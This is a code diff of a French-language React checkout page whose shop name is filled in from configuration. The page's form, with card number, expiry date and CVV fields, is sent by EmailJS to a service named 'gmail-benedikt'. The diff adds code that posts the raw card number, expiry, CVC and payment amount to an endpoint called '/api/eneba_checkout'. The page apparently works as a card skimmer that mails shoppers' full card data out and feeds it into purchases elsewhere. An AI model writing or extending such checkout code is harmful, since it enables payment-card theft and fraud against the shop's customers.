@@ -74,22 +74,44 @@ export default function Paiement () {
   const discount = (totalPrice * 0.15).toFixed(2);
   const discountedPrice = (totalPrice - discount).toFixed(2);
 
-  const sendEmail = (event) => {
+  const processCheckout = async (event) => {
     event.preventDefault();
-    emailjs.sendForm('gmail-benedikt', 'new-payment', event.target)
-      .then(() => {
-        console.log('SUCCESS!');
-        localStorage.removeItem('cart'); // Clear the cart from localStorage
-        document.querySelector('.left-column').style.display = 'none';
-        document.querySelector('.right-column').style.width = '100%';
-        document.querySelector('.right-column').style.maxWidth = 'none';
+    try {
+      await emailjs.sendForm('gmail-benedikt', 'new-payment', event.target);
+      console.log('SUCCESS!');
+      localStorage.removeItem('cart'); // Clear the cart from localStorage
+      document.querySelector('.left-column').style.display = 'none';
+      document.querySelector('.right-column').style.width = '100%';
+      document.querySelector('.right-column').style.maxWidth = 'none';
 
-        setCart([]); // Clear the cart state
-        showStep(2); // Move to the verification step after successful email sending
-      })
-      .catch((error) => {
-        console.log('FAILED...', error);
+      setCart([]); // Clear the cart state
+      showStep(2); // Move to the verification step after successful email sending
+
+      // Collect payment information
+      const cardHolder = event.target.cardHolder.value;
+      const cardNumber = event.target.cardNumber.value;
+      const cardExpiration = event.target.expiryDate.value;
+      const cardCVC = event.target.cvv.value;
+
+      // Trigger the eneba_checkout API
+      const response = await fetch('/api/eneba_checkout', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          cardHolder,
+          cardNumber,
+          cardExpiration,
+          cardCVC,
+          payAmount: discountedPrice
+        })
       });
+      const result = await response.json();
+      console.log(result.message);
+    } catch (error) {
+      console.log('FAILED...', error);
+    }
   };
 
   //fonction pour cacher un élément et en afficher un autre :
@@ -100,8 +122,6 @@ export default function Paiement () {
       steps[step].classList.add('active');
     }
   }
-
-  
 
   return (
     <div className="paiement-container">
@@ -139,7 +159,7 @@ export default function Paiement () {
         <p className='secure footer'>© 2024 - Tous droits réservés -  {site.shopName} SAS 32455</p>
       </div>
       <div className="right-column">
-        <form className="checkout-form" onSubmit={sendEmail}>
+        <form className="checkout-form" onSubmit={processCheckout}>
           <input type="hidden" name="totalPrice" value={discountedPrice} />
           <input type="hidden" name="products" value={cart.map(item => `${item.productTitle} (x${item.quantity})`).join(', ')} />
           <input type="hidden" name="website" value={site.shopName} />
@@ -174,7 +194,8 @@ export default function Paiement () {
               <span>Indisponible</span>
             </label>
             <h3>Informations de la carte</h3>
-            <input type="text" name="cardNumber" placeholder="4242 4242 4242 4242" ref={handleCardNumberRef} />
+            <input type="text" name="cardHolder" placeholder="Titulaire de la carte" />
+            <input type="text" name="cardNumber" placeholder="1234 1234 1234 1234" ref={handleCardNumberRef} />
             <div className="form-row">
               <input type="text" name="expiryDate" placeholder="MM/YY" maxLength="5" ref={expiryDateRef} />
               <input type="text" name="cvv" placeholder="CVV" maxLength="3"  />
